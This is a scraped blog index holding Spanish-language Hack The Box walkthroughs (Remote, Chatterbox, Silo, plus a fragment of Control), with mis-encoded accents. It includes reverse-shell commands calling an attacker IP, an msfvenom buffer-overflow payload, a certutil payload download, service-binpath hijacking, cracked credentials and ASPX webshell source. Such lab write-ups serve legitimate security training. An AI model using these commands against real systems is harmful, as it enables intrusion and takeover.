Dificultad de comunidad    Puntos 40   Creadores TRX    Reconocimiento Escaneo de host Escaneo completo de puertos ‚îî‚îÄ$ sudo nmap -sS --min-rate 5000 -vvv -op√®n -p- -n -Pn -oG nmap/all_ports_ss $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower.","title":"Hack The Box - Control"},{"content":"Estad√≠sticas    Caracter√≠stica Descripci√≥n     Nombre Remote   OS Windows   Dificultad oficial Easy   Dificultad de comunidad    Puntos 20   Creadores mrb3n    Reconocimiento Escaneo de host Escaneo completo de puertos ‚îî‚îÄ$ sudo nmap -sS --min-rate 5000 -vvv -open -p- -n -Pn -oG nmap/all_ports_ss $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-02 09:05 EDT Initiating SYN Stealth Scan at 09:05 Scanning 10.10.10.180 [65535 ports] Discovered open port 80/tcp on 10.10.10.180 Discovered open port 111/tcp on 10.10.10.180 Discovered open port 445/tcp on 10.10.10.180 Discovered open port 135/tcp on 10.10.10.180 Discovered open port 139/tcp on 10.10.10.180 Discovered open port 21/tcp on 10.10.10.180 Discovered open port 49664/tcp on 10.10.10.180 Discovered open port 49665/tcp on 10.10.10.180 Discovered open port 5985/tcp on 10.10.10.180 Discovered open port 49667/tcp on 10.10.10.180 Discovered open port 49678/tcp on 10.10.10.180 Discovered open port 47001/tcp on 10.10.10.180 Discovered open port 49680/tcp on 10.10.10.180 Discovered open port 49666/tcp on 10.10.10.180 Discovered open port 49679/tcp on 10.10.10.180 Discovered open port 2049/tcp on 10.10.10.180 Completed SYN Stealth Scan at 09:05, 13.25s elapsed (65535 total ports) Nmap scan report for 10.10.10.180 Host is up, received user-set (0.068s latency). Scanned at 2022-06-02 09:05:13 EDT for 13s Not shown: 65519 closed tcp ports (reset) PORT STATE SERVICE REASON 21/tcp open ftp syn-ack ttl 127 80/tcp open http syn-ack ttl 127 111/tcp open rpcbind syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 2049/tcp open nfs syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 47001/tcp open winrm syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49665/tcp open unknown syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49678/tcp open unknown syn-ack ttl 127 49679/tcp open unknown syn-ack ttl 127 49680/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 13.33 seconds Raw packets sent: 65924 (2.901MB) | Rcvd: 65535 (2.621MB) Escaneo espec√≠fico ‚îî‚îÄ$ nmap -sCV -p 21,80,111,135,139,445,2049,5985,47001,49664,49665,49666,49667,49678,49679,49680 -n -Pn -oN nmap/targeted $TARGET Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-02 09:08 EDT Nmap scan report for 10.10.10.180 Host is up (0.064s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT |_ftp-anon: Anonymous FTP login allowed (FTP code 230) 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Home - Acme Widgets 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100005 1,2,3 2049/tcp mountd | 100005 1,2,3 2049/tcp6 mountd | 100005 1,2,3 2049/udp mountd | 100005 1,2,3 2049/udp6 mountd | 100021 1,2,3,4 2049/tcp nlockmgr | 100021 1,2,3,4 2049/tcp6 nlockmgr | 100021 1,2,3,4 2049/udp nlockmgr | 100021 1,2,3,4 2049/udp6 nlockmgr | 100024 1 2049/tcp status | 100024 1 2049/tcp6 status | 100024 1 2049/udp status |_ 100024 1 2049/udp6 status 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 2049/tcp open mountd 1-3 (RPC #100005) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49678/tcp open msrpc Microsoft Windows RPC 49679/tcp open msrpc Microsoft Windows RPC 49680/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required | smb2-time: | date: 2022-06-02T13:09:19 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 102.15 seconds Enumeraci√≥n Servicios http - 80 ffuf Al navegar a trav√©s del sitio disponible y no encontrar informaci√≥n relevante en primera instancia, se decidi√≥ enumerar directorios de manera autom√°tica mediante:\nffuf -c -ic -u http://10.10.10.180/FUZZ -w /usr/share/dirb/wordlists/common.txt Encontrando as√≠ el directorio umbraco el cual no pareci√≥ com√∫n bajo el contexto del sitio.\nManual Al navegar manualmente al directorio se visualiz√≥ un login, a lo que posteriormente se busc√≥ informaci√≥n relacionada encontrando que se trataba de un sistema de gestor de contenidos (CMS).\nAl buscar rutas de explotaci√≥n se encontr√≥ un exploit (junto con su repositorio) el cu√°l para ser ejecutado se requiere contar con credenciales v√°lidas, abriendo paso a dos consideraciones de camino a la fase de explotaci√≥n:\n Realizar b√∫squeda de credenciales por alg√∫n sitio (preferente). Realizar fuerza bruta al login (siempre √∫ltimo recurso).  mountd - 2049 Al identificar el servicio y encontrar que se trataba de exposici√≥n de puntos de montaje a trav√©s de red, se hizo uso de showmount -e 10.10.10.180 visualizando as√≠ el montaje site_backups.\nPosteriormente, para poder navegar a trav√©s del directorio e interactuar c√≥modamente se cre√≥ la carpeta /mnt/remote y se ejecut√≥:\nsudo mount -t nfs 10.10.10.180:site_backups /mnt/remote -o nolock Para montar ah√≠ lo expuesto en el servidor.\nTeniendo en consideraci√≥n la b√∫squeda de credenciales, se buscaron patrones en texto claro en el punto de montaje.\nAl buscar en los contenidos de los archivos se√±alados (los que resultaron m√°s atractivos) se encontr√≥ en el archivo UmbracoTraceLog.intranet.txt un usuario potencial que se utiliz√≥ para continuar con la b√∫squeda de informaci√≥n.\nUtilizando lo encontrado, se procedi√≥ a hacer otra b√∫squeda descartando as√≠ m√∫ltiples archivos permitiendo verificar otros que con anterioridad no se revisaron.\nAl ser interpretado como binario, se uso:\nstrings Umbraco.pdf Para interpretar los caracteres legibles identificando as√≠ las credenciales admin@htb.local:b8be16afba8c314ad33d812f22a04991b90e2aaa.\nExplotaci√≥n Cracking de hash obtenido Guardando el hash del usuario admin en un archivo y haciendo uso de:\njohn hashes --wordlist=/usr/share/wordlists/rockyou.txt Se obtuvo la contrase√±a admin@htb.local:baconandcheese.\nRCE Despu√©s de validar las credenciales con el portal de umbraco y descargar el exploit previamente encontrado, se ejecut√≥:\npython exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c whoami Para corroborar su uso.\nHaciendo uso de Reverse Shell Generator se gener√≥ una reverse shell de powershell en base64 para entablar la conexi√≥n con:\npython exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a \u0026#39;-e JABjAGwAaQBlAG4AdAAg[...]\u0026#39; Post Explotaci√≥n Enumeraci√≥n Verificando los privilegios que se tienen con el usuario obtenido haciendo uso de:\nwhoami /all Se visualiz√≥ que el privilegio SeImpersonatePrivilege se encuentra habilitado, permitiendo su explotaci√≥n haciendo uso de Rotten/JuicyPotato.\nPor medio de winPEAS se encontr√≥ que el servicio de TeamViewer se encuentra habilitado y ejecut√°ndose. Concordando de alguna forma con el nombre de la m√°quina.\nPosteriormente, se realiz√≥ una b√∫squeda sobre los exploits disponibles sobre TeamViewer encontrando los siguientes.\nEn donde por curiosidad se tom√≥ en consideraci√≥n la exposici√≥n de credenciales y b√∫scando m√°s informaci√≥n al respecto se encontr√≥ el m√≥dulo de metasploit windows/gather/credentials/teamviewer_passwords y un repositorio en conjunto con su art√≠culo en donde se realiza una PoC para descifrar las credenciales alojadas en registros de Windows.\nTambi√©n dentro de la salida de winPEAS se visualiza que se cuenta con acceso completo al servicio UsoSvc, lo que permitir√≠a modificar las opciones del servicio y detener o iniciar su ejecuci√≥n.\nEscalaci√≥n de privilegios iis apppool ‚Üí nt authority system TeamViewer Al subir el script de powershell a la m√°quina, cargarlo como m√≥dulo en la sesi√≥n con Import-Module y ejecutar la funci√≥n de extraci√≥n Get-TeamViewPasswords, se descifr√≥ la contrase√±a !R3m0te!.\nEl mismo proceso puede ser realizado con el m√≥dulo de metasploit, sin embargo, es necesario tener una sesi√≥n abierta preferentemente de meterpreter (al tiempo que se resolvi√≥ la m√°quina el payload ejecutado fue windows/meterpreter_reverse_tcp)\nProbando posteriormente la contrase√±a con el usuario Administrator mediante:\nimpacket-psexec \u0026#39;Administrator:!R3m0te!@10.10.10.180\u0026#39; Obteniendo as√≠ acceso como NT AUTHORITY\\SYSTEM.\nModificaci√≥n de servicios Mediante:\nsc.exe qc UsoSvc Se puede ver m√°s a detalle informaci√≥n respecto este servicio.\nPor lo que haciendo uso de:\nsc.exe config UsoSvc binpath=\u0026#34;c:\\windows\\temp\\nc.exe -e cmd.exe 10.10.14.16 4321\u0026#34; Se busc√≥ la modificaci√≥n de la ruta del binario a ejecutar sustituy√©ndola con la ejecuci√≥n de netcat para entablar una reverse shell. Al consultar de nuevo la informaci√≥n del servicio, se observa la modificaci√≥n del valor.\nPor consiguiente al poner la conexi√≥n a la escucha y realizar un reinicio del servicio con:\nnet stop UsoSvc \u0026amp;\u0026amp; net start UsoSvc Se logr√≥ tener acceso como NT AUTHORITY\\SYSTEM satisfactoriamente.\nJuicyPotato Debido al no tener √©xito al aprovecharse del privilegio ni con el uso de JuicyPotato ni con PrintSpoofer se busc√≥ corroborar con el writeup oficial, el cu√°l indica que deber√≠a ser v√°lido el m√©todo, sin embargo, no se logr√≥ satisfactoriamente.\nReferencias  Exploit de Umbraco. Github - Exploit de Umbraco. HackTricks - Pentesting NFS Service. Microsoft - Importaci√≥n de m√≥dulo en powershell. Github - Descifrado de contrase√±as TeamViewer. Descrifrado de contrase√±as TeamViewer post de blog. HackTricks - Local Privilege Escalation - Services  ","permalink":"https://srrequiem.xyz/posts/htb-remote/","summary":"Estad√≠sticas    Caracter√≠stica Descripci√≥n     Nombre Remote   OS Windows   Dificultad oficial Easy   Dificultad de comunidad    Puntos 20   Creadores mrb3n    Reconocimiento Escaneo de host Escaneo completo de puertos ‚îî‚îÄ$ sudo nmap -sS --min-rate 5000 -vvv -open -p- -n -Pn -oG nmap/all_ports_ss $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower.","title":"Hack The Box - Remote"},{"content":"Estad√≠sticas    Caracter√≠stica Descripci√≥n     Nombre Chatterbox   OS Windows   Dificultad oficial Medium   Dificultad de comunidad    Puntos 30   Creadores lkys37en    Reconocimiento Escaneo de host Escaneo completo de puertos ‚îî‚îÄ$ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 13:36 EDT Initiating Connect Scan at 13:36 Scanning 10.10.10.74 [65535 ports] Discovered open port 135/tcp on 10.10.10.74 Discovered open port 139/tcp on 10.10.10.74 Discovered open port 445/tcp on 10.10.10.74 Discovered open port 49152/tcp on 10.10.10.74 Discovered open port 49154/tcp on 10.10.10.74 Discovered open port 9256/tcp on 10.10.10.74 Discovered open port 49153/tcp on 10.10.10.74 Discovered open port 9255/tcp on 10.10.10.74 Discovered open port 49155/tcp on 10.10.10.74 Discovered open port 49157/tcp on 10.10.10.74 Discovered open port 49156/tcp on 10.10.10.74 Completed Connect Scan at 13:37, 29.11s elapsed (65535 total ports) Nmap scan report for 10.10.10.74 Host is up, received user-set (0.073s latency). Scanned at 2022-05-27 13:36:42 EDT for 29s Not shown: 54223 closed tcp ports (conn-refused), 11301 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 135/tcp open msrpc syn-ack 139/tcp open netbios-ssn syn-ack 445/tcp open microsoft-ds syn-ack 9255/tcp open mon syn-ack 9256/tcp open unknown syn-ack 49152/tcp open unknown syn-ack 49153/tcp open unknown syn-ack 49154/tcp open unknown syn-ack 49155/tcp open unknown syn-ack 49156/tcp open unknown syn-ack 49157/tcp open unknown syn-ack Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 29.15 seconds Escaneo espec√≠fico ‚îî‚îÄ$ nmap -sCV -p 135,139,445,9255,9256,49152,49153,49154,49155,49156,49157 -n -Pn -oN nmap/targeted $TARGET Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 13:39 EDT Nmap scan report for 10.10.10.74 Host is up (0.074s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 9255/tcp open http AChat chat system httpd |_http-server-header: AChat |_http-title: Site doesn\u0026#39;t have a title. 9256/tcp open achat AChat chat system 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 6h20m01s, deviation: 2h18m36s, median: 4h59m59s | smb2-time: | date: 2022-05-27T22:40:43 |_ start_date: 2022-05-27T22:34:47 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.1: |_ Message signing enabled but not required | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: Chatterbox | NetBIOS computer name: CHATTERBOX\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2022-05-27T18:40:47-04:00 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 70.63 seconds Enumeraci√≥n Servicios achat - 9255, 9256 Manual Al buscar hacer un reconocimiento directamente por alguna versi√≥n vulnerable se encontr√≥ este repositorio en github de una prueba de concepto sobre la explotaci√≥n del programa, probado en su versi√≥n y arquitectura AChat 0.150 Beta 7 Windows 7/8/10 x86/x64. Por lo que directamente se prob√≥ el exploit.\nExplotaci√≥n Buffer Overflow - RCE Pasos previos | Preparaci√≥n Dadas las indicaciones en la PoC se gener√≥ el shellcode correspondiente usando:\nmsfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp RHOST=$RHOST LHOST=10.10.14.16 LPORT=4321 exitfunc=thread -e x86/unicode_mixed -b \u0026#39;\\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#39; BufferRegister=EAX -f python \u0026gt; scode.txt Sustituyendo los valores correspondientes en el script del shellcode y host.\nEjecuci√≥n Obteniendo acceso como el usuario alfred.\nPost Explotaci√≥n Enumeraci√≥n Posteriormente al ejecutar winPEAS, se identificaron dos rutas potenciales a probar:\n El usuario con el que se cuenta (alfred) tiene acceso completo al directorio del usuario Administrator. Existen credenciales AutoLogon visibles.  Escalaci√≥n de privilegios alfred ‚Üí nt authority system En el primer caso, bastar√≠a con leer, escribir o ejecutar cualquier archivo dentro del directorio, si llegara a suceder que no se permite el acceso a un archivo bastar√≠a con hacer uso de icacls para efectuar el cambio de permisos lo cual por herencia o jerarqu√≠a del directorio, se permitir√≠a este cambio pudiendo as√≠ leer la bandera de root.txt.\nPor medio de:\nicacls .\\root.txt /e /p alfred:f Tomando como referencia este post para verificar el uso del binario.\nEn el segundo caso, al probar alguna herramienta que permita acceso al sistema con credenciales como psexec se puede obtener una shell como NT AUTHORITY SYSTEM, probando las credenciales obtenidas anteriormente bajo la suposici√≥n de reutilizaci√≥n de contrase√±a.\nEjecutando:\nimpacket-psexec \u0026#39;Administrator:Welcome1!@10.10.10.74\u0026#39; Referencias  AChat expoit. Windows change access permissions from the command line.  ","permalink":"https://srrequiem.xyz/posts/htb-chatterbox/","summary":"Estad√≠sticas    Caracter√≠stica Descripci√≥n     Nombre Chatterbox   OS Windows   Dificultad oficial Medium   Dificultad de comunidad    Puntos 30   Creadores lkys37en    Reconocimiento Escaneo de host Escaneo completo de puertos ‚îî‚îÄ$ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower.","title":"Hack The Box - Chatterbox"},{"content":"Estad√≠sticas    Caracter√≠stica Descripci√≥n     Nombre Silo   OS Windows   Dificultad oficial Medium   Dificultad de comunidad    Puntos 30   Creadores egre55    Reconocimiento Escaneo de host Escaneo completo de puertos ‚îî‚îÄ$ sudo nmap -sS --min-rate 5000 -vvv -open -p- -n -Pn -oG nmap/all_ports_ss $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-23 23:09 EDT Initiating SYN Stealth Scan at 23:09 Scanning 10.10.10.82 [65535 ports] Discovered open port 80/tcp on 10.10.10.82 Discovered open port 445/tcp on 10.10.10.82 Discovered open port 139/tcp on 10.10.10.82 Discovered open port 135/tcp on 10.10.10.82 Discovered open port 49161/tcp on 10.10.10.82 Discovered open port 49155/tcp on 10.10.10.82 Discovered open port 49162/tcp on 10.10.10.82 Discovered open port 49154/tcp on 10.10.10.82 Discovered open port 49160/tcp on 10.10.10.82 Discovered open port 47001/tcp on 10.10.10.82 Discovered open port 49153/tcp on 10.10.10.82 Discovered open port 49159/tcp on 10.10.10.82 Discovered open port 49152/tcp on 10.10.10.82 Discovered open port 5985/tcp on 10.10.10.82 Discovered open port 1521/tcp on 10.10.10.82 Completed SYN Stealth Scan at 23:09, 13.20s elapsed (65535 total ports) Nmap scan report for 10.10.10.82 Host is up, received user-set (0.064s latency). Scanned at 2022-05-23 23:09:27 EDT for 14s Not shown: 65520 closed tcp ports (reset) PORT STATE SERVICE REASON 80/tcp open http syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 1521/tcp open oracle syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 47001/tcp open winrm syn-ack ttl 127 49152/tcp open unknown syn-ack ttl 127 49153/tcp open unknown syn-ack ttl 127 49154/tcp open unknown syn-ack ttl 127 49155/tcp open unknown syn-ack ttl 127 49159/tcp open unknown syn-ack ttl 127 49160/tcp open unknown syn-ack ttl 127 49161/tcp open unknown syn-ack ttl 127 49162/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 13.27 seconds Raw packets sent: 65634 (2.888MB) | Rcvd: 65535 (2.621MB) Escaneo espec√≠fico ‚îî‚îÄ$ nmap -sCV -p 80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49160,49161,49162 -n -Pn -oN nmap/targeted $TARGET Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-23 23:11 EDT Nmap scan report for 10.10.10.82 Host is up (0.065s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 8.5 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server |_http-server-header: Microsoft-IIS/8.5 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1521/tcp open oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49159/tcp open oracle-tns Oracle TNS listener (requires service name) 49160/tcp open msrpc Microsoft Windows RPC 49161/tcp open msrpc Microsoft Windows RPC 49162/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3.0.2: |_ Message signing enabled but not required | smb2-time: | date: 2022-05-24T03:13:17 |_ start_date: 2022-05-24T02:53:36 | smb-security-mode: | authentication_level: user | challenge_response: supported |_ message_signing: supported Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 127.10 seconds Enumeraci√≥n Servicios Microsoft IIS - 80 Se expone la p√°gina por default de Microsoft IIS y al hacer uso de herramientas de fuzzing no se tuvo √©xito al buscar alg√∫n directorio relevante, sin embargo, para el m√©todo intencionado de resoluci√≥n es importante tener a consideraci√≥n.\nOracle TNS Listener - 1521 Despu√©s de revisar acerca de la metodolog√≠a empleada para este servicio, se busc√≥ obtener informaci√≥n relevante respecto la versi√≥n, estatus, etc, haciendo uso de tnscmd10g sin √©xito alguno.\nPosteriormente, en la metodolog√≠a se mencionan los SID (Identificadores de Servicio, esencialmente pueden ser reconocidos como los nombres de las bases de datos), los cuales dependiendo de la instalaci√≥n realizada pueden existir uno o m√°s SIDs por defecto. Al no poder obtenerlos mediante tnscmd10g, se sugiere que realice fuerza bruta de los com√∫nes para identificar los existentes.\nhydra Haciendo uso de:\nhydra -L content/sids-oracle.txt -s 1521 10.10.10.82 oracle-sid Con el conjunto de diccionarios que ofrece hacktricks (el cual es un compendio de las listas de nmap y metasploit), se identificaron los SIDs:\n CLRExtProc. PLSExtProc. XE.  Explotaci√≥n Nota: Despu√©s de resolver la m√°quina se suele verificar el proceso con otras fuentes, identificando de esta manera que existen 2 caminos a resolver la m√°quina una intencionada y una no intencionada, una m√°s directa por no decir f√°cil que la otra. Primero se expondr√° el m√©todo por el cu√°l se resolvi√≥ inicialmente y posteriormente la resoluci√≥n intencionada.\nNo intencionada Obtenci√≥n de credenciales Pasos previos | Preparaci√≥n Haciendo uso de ODAT se obtuvieron credenciales de un usuario disponible, por medio de un m√≥dulo que la herramienta ofrece. Inicialmente se requiere la instalaci√≥n descrita en el repositorio aunque por lo que respecta en kali, basta con clonar el repositorio.\nEjecuci√≥n Como parte inicial se ejecut√≥ un \u0026ldquo;Ave Mar√≠a\u0026rdquo; invocando todos los m√≥dulos que la herramienta ofrece para visualizar si de esta manera se identificaba algo que pudiera servir, para ello, la herramienta solicita un SID v√°lido a ocupar, siendo XE el SID con informaci√≥n √∫til (identific√°ndolo despu√©s de ejecutar el comando con cada uno de los SIDs). Haciendo uso de:\n./odat.py all -s 10.10.10.82 -p 1521 -d XE Posteriormente se identific√≥ que el m√≥dulo encargado de hacer este proceso es passwordguesser el cual simplemente sustituir√≠a a all del comando.\nRCE Pasos previos | Preparaci√≥n Posteriormente, al revisar los m√≥dulos disponibles se identific√≥ que tanto el m√≥dulo dbmsscheduler como el m√≥dulo externaltable ofrecen capacidad de ejecutar comandos. Que al intentar usarlos no se permiti√≥ su ejecuci√≥n debido a la falta de privilegios, sin embargo, se encontr√≥ que mediante la bandera --sysdba existe la posibilidad de \u0026ldquo;escalar\u0026rdquo; estos privilegios o impersonar un rol superior al que se ten√≠a.\nEjecuci√≥n Obteniendo as√≠, una vez ejecutada la reverse shell, acceso directamente como administrador.\n  Creando un payload con:\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.16 LPORT=1234 -f exe \u0026gt; pwn.exe   Descarg√°ndolo con:\n./odat.py dbmsscheduler -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --exec \u0026#34;certutil.exe -f -urlcache -split http://10.10.14.16/pwn.exe c:\\windows\\temp\\pwn.exe\u0026#34; --sysdba   Y ejecut√°ndolo con:\n./odat.py externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --exec \u0026#34;c:\\windows\\temp\u0026#34; \u0026#34;pwn.exe\u0026#34; --sysdba   Intencionada Si bien odat permite la lectura, escritura y ejecuci√≥n de archivos, todo lo que realiza en estos procesos no resulta tan \u0026ldquo;transparente\u0026rdquo; por lo que para entender un poco acerca de Oracle se realizo parte del mismo proceso por medio de SQL directamente.\nNota: Se da por hecho que se realizo el descubrimiento de los SIDs y de las credenciales v√°lidas, dado que scott:tiger son credenciales por default.\nRCE Pasos previos | Preparaci√≥n Como parte de la instalaci√≥n de odat, se realiza la instalaci√≥n del cliente sql para conectarse a la base de datos de Oracle.\nPor lo que una vez instalado se permite la conexi√≥n al host por medio de:\nsqlplus64 scott/tiger@10.10.10.82:1521/XE as sysdba Ejecuci√≥n Oracle ocupa su propia sintaxis por lo que con el siguiente pedazo de c√≥digo se busc√≥ obtener el contenido del archivo por defecto del servidor. Buscando obtener respuesta por medio del prompt configurando primeramente set serveroutput ON para su visualizaci√≥n.\ndeclare f utl_file.file_type; s varchar(200); begin f := utl_file.fopen(\u0026#39;/inetpub/wwwroot\u0026#39;, \u0026#39;iisstart.htm\u0026#39;, \u0026#39;R\u0026#39;); utl_file.get_line(f,s); utl_file.fclose(f); dbms_output.put_line(s); end; Por otra parte se puede verificar que tambi√©n exista la capacidad de escribir a un archivo, verific√°ndolo con el siguiente segmento de c√≥digo.\ndeclare f utl_file.file_type; s varchar(5000) := \u0026#39;Hello world\u0026#39;; begin f := utl_file.fopen(\u0026#39;/inetpub/wwwroot\u0026#39;, \u0026#39;srrequiem.txt\u0026#39;, \u0026#39;W\u0026#39;); utl_file.put_line(f,s); utl_file.fclose(f); end; Una vez validada la escritura, se abre la puerta a la creaci√≥n de una reverse shell, el inconveniente es que debido al espacio limitado en las variables respecto a los caracteres no fue posible llevarlo a cabo, por lo que se opt√≥ por una webshell en su lugar.\nUtilizando /usr/share/webshells/aspx/cmdasp.aspx eliminando estilos, comentarios y saltos de l√≠nea para reducir los caracteres se obtuvo ejecuci√≥n en la m√°quina.\nC√≥digo de p√°gina empleado:\n\u0026lt;%@ Page Language=\u0026#34;C#\u0026#34; Debug=\u0026#34;true\u0026#34; Trace=\u0026#34;false\u0026#34; %\u0026gt;\u0026lt;%@ Import Namespace=\u0026#34;System.Diagnostics\u0026#34; %\u0026gt;\u0026lt;%@ Import Namespace=\u0026#34;System.IO\u0026#34; %\u0026gt;\u0026lt;script Language=\u0026#34;c#\u0026#34; runat=\u0026#34;server\u0026#34;\u0026gt;void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = \u0026#34;cmd.exe\u0026#34;;psi.Arguments = \u0026#34;/c \u0026#34;+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write(\u0026#34;\u0026lt;pre\u0026gt;\u0026#34;);Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write(\u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;);}\u0026lt;/script\u0026gt;\u0026lt;HTML\u0026gt;\u0026lt;body \u0026gt;\u0026lt;form id=\u0026#34;cmd\u0026#34; 